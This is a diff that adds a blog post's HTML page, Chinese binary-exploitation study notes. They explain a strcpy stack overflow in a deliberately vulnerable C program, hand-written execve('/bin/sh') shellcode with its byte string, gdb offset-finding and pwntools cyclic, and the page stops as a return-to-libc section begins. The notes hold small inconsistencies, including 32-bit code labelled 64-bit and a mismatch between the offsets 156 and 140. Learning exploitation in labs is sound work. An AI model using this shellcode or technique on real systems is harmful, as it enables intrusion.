@@ -1,0 +1,805 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+  <link rel="alternate" href="/atom.xml" title="ZERO-A-ONE" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Kopieren',
+      copy_success: 'Kopiert',
+      copy_failure: 'Kopieren fehlgeschlagen'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="PWN工具集合 zio - 框架 接口简单易用 https://github.com/zTrix/zio   Pwntools Pwn框架，集成了很多工具，例如shellcode生成，ROP链生成等 http://pwntools.com/ https://github.com/gallopsled/pwntools   peda/pwndbg - gdb调试插件 libheap  利用栈溢出Ex">
+<meta property="og:type" content="article">
+<meta property="og:title" content="长亭PWN笔记01">
+<meta property="og:url" content="http://yoursite.com/2020/04/26/│ñ═ñPWN▒╩╝╟01/index.html">
+<meta property="og:site_name" content="ZERO-A-ONE">
+<meta property="og:description" content="PWN工具集合 zio - 框架 接口简单易用 https://github.com/zTrix/zio   Pwntools Pwn框架，集成了很多工具，例如shellcode生成，ROP链生成等 http://pwntools.com/ https://github.com/gallopsled/pwntools   peda/pwndbg - gdb调试插件 libheap  利用栈溢出Ex">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2020-04-27T02:56:48.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="长亭PWN笔记01">
+<meta name="twitter:description" content="PWN工具集合 zio - 框架 接口简单易用 https://github.com/zTrix/zio   Pwntools Pwn框架，集成了很多工具，例如shellcode生成，ROP链生成等 http://pwntools.com/ https://github.com/gallopsled/pwntools   peda/pwndbg - gdb调试插件 libheap  利用栈溢出Ex">
+  <link rel="canonical" href="http://yoursite.com/2020/04/26/│ñ═ñPWN▒╩╝╟01/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>长亭PWN笔记01 | ZERO-A-ONE</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ZERO-A-ONE</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Navigationsleiste an/ausschalten">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Suche</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="Suche..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+     <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/26/│ñ═ñPWN▒╩╝╟01/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ZERO-A-ONE">
+      <meta itemprop="description" content="Resit much,Obey little">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ZERO-A-ONE">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">长亭PWN笔记01
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
+              
+                
+              
+
+              <time title="Erstellt: 2020-04-26 01:54:26 / Geändert am: 19:56:48" itemprop="dateCreated datePublished" datetime="2020-04-26T01:54:26-07:00">2020-04-26</time>
+            </span>
+          
+            
+
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">in</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/长亭PWN笔记/" itemprop="url" rel="index"><span itemprop="name">长亭PWN笔记</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="PWN工具集合"><a href="#PWN工具集合" class="headerlink" title="PWN工具集合"></a>PWN工具集合</h2><ul>
+<li>zio - 框架<ul>
+<li>接口简单易用</li>
+<li><a href="https://github.com/zTrix/zio" target="_blank" rel="noopener">https://github.com/zTrix/zio</a></li>
+</ul>
+</li>
+<li>Pwntools<ul>
+<li>Pwn框架，集成了很多工具，例如shellcode生成，ROP链生成等</li>
+<li><a href="http://pwntools.com/" target="_blank" rel="noopener">http://pwntools.com/</a></li>
+<li><a href="https://github.com/gallopsled/pwntools" target="_blank" rel="noopener">https://github.com/gallopsled/pwntools</a></li>
+</ul>
+</li>
+<li>peda/pwndbg - gdb调试插件</li>
+<li>libheap</li>
+</ul>
+<h2 id="利用栈溢出"><a href="#利用栈溢出" class="headerlink" title="利用栈溢出"></a>利用栈溢出</h2><h3 id="Example-BOE-program："><a href="#Example-BOE-program：" class="headerlink" title="Example BOE program："></a>Example BOE program：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">if</span> (argc&lt;<span class="number">2</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"argv[1]:%s\n"</span>,buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<ol>
+<li><p>作为第一个漏洞利用的案例，我们不开启栈不可执行和栈canary的保护选项</p>
+</li>
+<li><p>argc即命令行参数个数</p>
+</li>
+<li><p>argv[0]即程序名字符串本身，argv[1]是第一个参数，以此类推</p>
+</li>
+</ol>
+</blockquote>
+<p>编译命令如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -z execstack -fno-stack-protector bof.c -o bof -m32</span><br></pre></td></tr></table></figure>
+
+<h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p>程序接收命令行输入第一个参数，如果这个参数过长，strcpy时会溢出栈上缓冲区buf</p>
+<table>
+<thead>
+<tr>
+<th align="center">高地址</th>
+<th align="center">char **argv</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"></td>
+<td align="center">int argc</td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">return address</td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">saved %ebp</td>
+</tr>
+<tr>
+<td align="center">低地址</td>
+<td align="center">char buf[128]</td>
+</tr>
+</tbody></table>
+<ul>
+<li>栈在内存中是从高地址到低地址增长</li>
+<li>局部变量char是从低地址到高地址增长</li>
+</ul>
+<p>当字符串参数过长就会出现：</p>
+<table>
+<thead>
+<tr>
+<th align="center">高地址</th>
+<th align="center">char **argv</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"></td>
+<td align="center">int argc</td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">buf[132~135]</td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">buf[128~131]</td>
+</tr>
+<tr>
+<td align="center">低地址</td>
+<td align="center">buf[0~127]</td>
+</tr>
+</tbody></table>
+<p>可以把Shellcode放在返回地址之后，然后通过覆盖返回地址跳转至Shellcode</p>
+<table>
+<thead>
+<tr>
+<th align="center">高地址</th>
+<th align="center">Shellcode</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"></td>
+<td align="center">Shellcode</td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">Shellcode addr</td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">buf[128~131]</td>
+</tr>
+<tr>
+<td align="center">低地址</td>
+<td align="center">buf[0~127]</td>
+</tr>
+</tbody></table>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload : padding1 + address of shellcode + shellcode</span><br></pre></td></tr></table></figure>
+
+<p>有一种手法可以把return address覆盖为<code>jmp esp</code>的地址，这样就不用管具体Shellcode addr的具体地址了，只要shellcode跟在<code>jmp esp</code>指令后面即可</p>
+<table>
+<thead>
+<tr>
+<th align="center">高地址</th>
+<th align="center">Shellcode</th>
+<th align="center"></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"></td>
+<td align="center">Shellcode</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">Shellcode addr</td>
+<td align="center">jmp esp</td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">buf[128~131]</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">低地址</td>
+<td align="center">buf[0~127]</td>
+<td align="center"></td>
+</tr>
+</tbody></table>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload : padding1 + address of jmp esp + shellcode</span><br></pre></td></tr></table></figure>
+
+<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><h3 id="手写"><a href="#手写" class="headerlink" title="手写"></a>手写</h3><p>首先查看一下execve函数的原型：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename,<span class="keyword">char</span> *<span class="keyword">const</span> argv[],cahr *<span class="keyword">const</span> envp[])</span></span></span><br></pre></td></tr></table></figure>
+
+<p>手写64位下的shellcode代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xor %eax,%eax</span><br><span class="line">pushl %eax</span><br><span class="line">push $0x68732f2f</span><br><span class="line">push $0x6e69622f</span><br><span class="line">movl %esp,%ebx</span><br><span class="line">pushl %eax</span><br><span class="line">pushl %ebx</span><br><span class="line">movl %esp,%ecx</span><br><span class="line">cltd</span><br><span class="line">movb $0xb,%al</span><br><span class="line">int $0x80</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>此处eax为0，因此cltd相当于将edx也设为0</p>
+</blockquote>
+<p>以上代码实现的效果就是</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">"/bin/sh"</span>,null,null)</span><br></pre></td></tr></table></figure>
+
+<p>Syscall 调用约定</p>
+<ul>
+<li>syscall number: %eax=0xb</li>
+<li>第一个参数：%ebx=filename</li>
+<li>第二个参数：%ecx=argv</li>
+<li>第三个参数：%edx=envp=0</li>
+<li>第四个参数：%esi</li>
+<li>第五个参数：%edi</li>
+<li>第六个参数：%ebp</li>
+</ul>
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>用内联（inline）汇编测试编写的shellcode，也可以使用汇编器as直接编译汇编代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shellcode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _asm_(</span><br><span class="line">    <span class="string">"xor %eax,%eax\n\t"</span></span><br><span class="line">    <span class="string">"pushl %eax\n\t"</span></span><br><span class="line">    <span class="string">"push $0x68732f2f\n\t"</span></span><br><span class="line">    <span class="string">"push $0x6e69622f\n\t"</span></span><br><span class="line">    <span class="string">"movl %esp,%ebx\n\t"</span></span><br><span class="line">    <span class="string">"pushl %eax\n\t"</span></span><br><span class="line">    <span class="string">"pushl %ebx\n\t"</span></span><br><span class="line">    <span class="string">"movl %esp,%ecx\n\t"</span>  </span><br><span class="line">    <span class="string">"cltd\n\t"</span></span><br><span class="line">    <span class="string">"movb $0xb,%al\n\t"</span></span><br><span class="line">    <span class="string">"int $0x80\n\t"</span>      </span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    shellcode();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="提取"><a href="#提取" class="headerlink" title="提取"></a>提取</h3><p>提取测试代码反汇编出来的机器码</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d shellcode</span><br></pre></td></tr></table></figure>
+
+<p>提取得到shellcode的指令的机器码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SHELLCODE = &quot;</span><br><span class="line">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b \xcd\x80</span><br><span class="line">&quot;</span><br></pre></td></tr></table></figure>
+
+<p>所以上述代码还可以改写为：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> shellcode[]=</span><br><span class="line"><span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b \xcd\x80"</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span>(*f)()=(<span class="keyword">void</span>(*)())shellcode;</span><br><span class="line">    f();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>段代码中，shellcode存储在全局字符数组中，属于.data section,编译器默认其不可执行，必须加上选项-z execstack,即开启栈/堆/数据段可执行</p>
+<h2 id="栈溢出漏洞利用步骤"><a href="#栈溢出漏洞利用步骤" class="headerlink" title="栈溢出漏洞利用步骤"></a>栈溢出漏洞利用步骤</h2><ol>
+<li>找到能够刚好覆盖返回地址的缓冲区长度</li>
+<li>填充Shellcode并找到Shellcode所在地址</li>
+<li>将返回地址覆盖为Shellcode地址</li>
+</ol>
+<h2 id="寻找填充长度"><a href="#寻找填充长度" class="headerlink" title="寻找填充长度"></a>寻找填充长度</h2><h3 id="手动寻找"><a href="#手动寻找" class="headerlink" title="手动寻找"></a>手动寻找</h3><p>为了精确覆盖返回地址，首先要找到从缓冲区开头到栈上的返回地址有多少距离。我们可以先找到缓冲区开头的地址，再找到返回地址所在位置，两者相减即可。为了找到缓冲区开头地址，我们可以在调用strcpy之前下断点，通过查看strcpy第一个参数即可。另外，可在main函数返回前断下，此时esp指向的即是返回地址所在位置。</p>
+<p>现在依然以上文的示例程序为例：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Desktop/test$ gdb -q --args bof AAAA</span><br><span class="line">pwndbg: loaded 179 commands. Type pwndbg [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $ida gdb functions (can be used with print/break)</span><br><span class="line">Reading symbols from bof...(no debugging symbols found)...done.</span><br><span class="line"><span class="meta">pwndbg&gt;</span> r</span><br><span class="line">Starting program: /home/syc/Desktop/test/bof AAAA</span><br><span class="line">argv[1]:AAAA</span><br><span class="line">[Inferior 1 (process 3282) exited normally]</span><br><span class="line"><span class="meta">pwndbg&gt;</span> disassemble main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x5655554d &lt;+0&gt;:	lea    ecx,[esp+0x4]</span><br><span class="line">   0x56555551 &lt;+4&gt;:	and    esp,0xfffffff0</span><br><span class="line">   0x56555554 &lt;+7&gt;:	push   DWORD PTR [ecx-0x4]</span><br><span class="line">   0x56555557 &lt;+10&gt;:	push   ebp</span><br><span class="line">   0x56555558 &lt;+11&gt;:	mov    ebp,esp</span><br><span class="line">   0x5655555a &lt;+13&gt;:	push   ebx</span><br><span class="line">   0x5655555b &lt;+14&gt;:	push   ecx</span><br><span class="line">   0x5655555c &lt;+15&gt;:	add    esp,0xffffff80</span><br><span class="line">   0x5655555f &lt;+18&gt;:	call   0x56555450 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line">   0x56555564 &lt;+23&gt;:	add    ebx,0x1a70</span><br><span class="line">   0x5655556a &lt;+29&gt;:	mov    eax,ecx</span><br><span class="line">   0x5655556c &lt;+31&gt;:	cmp    DWORD PTR [eax],0x1</span><br><span class="line">   0x5655556f &lt;+34&gt;:	jg     0x56555578 &lt;main+43&gt;</span><br><span class="line">   0x56555571 &lt;+36&gt;:	mov    eax,0x1</span><br><span class="line">   0x56555576 &lt;+41&gt;:	jmp    0x565555b1 &lt;main+100&gt;</span><br><span class="line">   0x56555578 &lt;+43&gt;:	mov    eax,DWORD PTR [eax+0x4]</span><br><span class="line">   0x5655557b &lt;+46&gt;:	add    eax,0x4</span><br><span class="line">   0x5655557e &lt;+49&gt;:	mov    eax,DWORD PTR [eax]</span><br><span class="line">   0x56555580 &lt;+51&gt;:	sub    esp,0x8</span><br><span class="line">   0x56555583 &lt;+54&gt;:	push   eax</span><br><span class="line">   0x56555584 &lt;+55&gt;:	lea    eax,[ebp-0x88]</span><br><span class="line">   0x5655558a &lt;+61&gt;:	push   eax</span><br><span class="line">   0x5655558b &lt;+62&gt;:	call   0x565553e0 &lt;strcpy@plt&gt;</span><br><span class="line">   0x56555590 &lt;+67&gt;:	add    esp,0x10</span><br><span class="line">   0x56555593 &lt;+70&gt;:	sub    esp,0x8</span><br><span class="line">   0x56555596 &lt;+73&gt;:	lea    eax,[ebp-0x88]</span><br><span class="line">   0x5655559c &lt;+79&gt;:	push   eax</span><br><span class="line">   0x5655559d &lt;+80&gt;:	lea    eax,[ebx-0x1994]</span><br><span class="line">   0x565555a3 &lt;+86&gt;:	push   eax</span><br><span class="line">   0x565555a4 &lt;+87&gt;:	call   0x565553d0 &lt;printf@plt&gt;</span><br><span class="line">   0x565555a9 &lt;+92&gt;:	add    esp,0x10</span><br><span class="line">   0x565555ac &lt;+95&gt;:	mov    eax,0x0</span><br><span class="line">   0x565555b1 &lt;+100&gt;:	lea    esp,[ebp-0x8]</span><br><span class="line">   0x565555b4 &lt;+103&gt;:	pop    ecx</span><br><span class="line">   0x565555b5 &lt;+104&gt;:	pop    ebx</span><br><span class="line">   0x565555b6 &lt;+105&gt;:	pop    ebp</span><br><span class="line">   0x565555b7 &lt;+106&gt;:	lea    esp,[ecx-0x4]</span><br><span class="line">   0x565555ba &lt;+109&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+
+<p>在调用<code>strcpy</code>和<code>ret</code>指令处下断点</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> b *0x5655558b</span><br><span class="line">Breakpoint 1 at 0x5655558b</span><br><span class="line"><span class="meta">pwndbg&gt;</span> b *0x565555ba</span><br><span class="line">Breakpoint 2 at 0x565555ba</span><br></pre></td></tr></table></figure>
+
+<p>开始调试</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> r AAAA</span><br><span class="line">Starting program: /home/syc/Desktop/test/bof AAAA</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x5655558b in main ()</span><br><span class="line"> ► 0x5655558b &lt;main+62&gt;     call   strcpy@plt &lt;0x565553e0&gt;</span><br><span class="line">        dest: 0xffffced0 ◂— 0x0</span><br><span class="line">        src: 0xffffd1fd ◂— 'AAAA'</span><br><span class="line"></span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/wx $esp</span><br><span class="line">0xffffcec0:	0xffffced0	0xffffd1fd </span><br><span class="line">//分别是strcpy的两个参数，第一个参数即为目标缓冲区0xffffced0</span><br><span class="line"><span class="meta">pwndbg&gt;</span> c</span><br><span class="line">Continuing.</span><br><span class="line">argv[1]:AAAA</span><br><span class="line"></span><br><span class="line">Breakpoint 2, 0x565555ba in main ()</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/wx $esp</span><br><span class="line">0xffffcf6c:	0xf7df4e81</span><br><span class="line"><span class="meta">pwndbg&gt;</span> p/d 0xffffcf6c - 0xffffced0</span><br><span class="line"><span class="meta">$</span>1 = 156</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在第一个断点处，找到缓冲区起始地址为0xffffced0</li>
+<li>2在第二个断点处，找到缓冲区起始地址为0xffffcf6c</li>
+<li>二者相减可以知道溢出超过140字节时会覆盖返回地址</li>
+</ul>
+<h3 id="pwntools之cyclic"><a href="#pwntools之cyclic" class="headerlink" title="pwntools之cyclic"></a>pwntools之cyclic</h3><p>Cyclic pattern是一个很强大的功能，大概意思就是，使用pwntools生成一个pattern，pattern就是指一个字符串，可以通过其中的一部分数据去定位到他在一个字符串中的位置</p>
+<p>在我们完成栈溢出题目的时候，使用pattern可以大大的减少计算溢出点的时间。<br>用法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cyclic(0x100) # 生成一个0x100大小的pattern，即一个特殊的字符串</span><br><span class="line">cyclic_find(0x61616161) # 找到该数据在pattern中的位置</span><br><span class="line">cyclic_find(&apos;aaaa&apos;) # 查找位置也可以使用字符串去定位</span><br></pre></td></tr></table></figure>
+
+<p>比如，我们在栈溢出的时候，首先构造cyclic(0x100)，或者更长长度的pattern，进行输入，输入后pc的值变味了0x61616161，那么我们通过cyclic_find(0x61616161)就可以得到从哪一个字节开始会控制PC寄存器了，避免了很多没必要的计算</p>
+<h2 id="Return-to-Libc"><a href="#Return-to-Libc" class="headerlink" title="Return to Libc"></a>Return to Libc</h2><p>发生栈溢出时，不跳转到shellcode，而实跳转到libc中的函数</p>
+<h3 id="简单的一个函数"><a href="#简单的一个函数" class="headerlink" title="简单的一个函数"></a>简单的一个函数</h3><p>以调用system函数为例的栈布局</p>
+<table>
+<thead>
+<tr>
+<th align="center"></th>
+<th align="center">0</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"></td>
